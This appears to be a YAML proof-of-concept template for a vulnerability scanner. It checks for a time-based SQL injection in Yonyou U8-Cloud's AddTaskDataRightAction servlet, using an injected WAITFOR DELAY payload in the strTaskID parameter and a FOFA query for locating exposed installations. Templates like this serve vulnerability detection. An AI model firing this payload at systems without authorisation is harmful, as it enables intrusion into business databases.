id: poc-yaml-yongyou-u8cloud-addtaskdatarightaction-sqli
info:
  name: 用友U8-Cloud AddTaskDataRightAction SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 用友U8cloud
  fofa: app="用友-U8-Cloud"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--
  expression: status_code == 200 && contains(body,"错误提示 - iUFO") && contains(body,"【操作失败】")
    && duration > t1 && duration < t2
transport: http
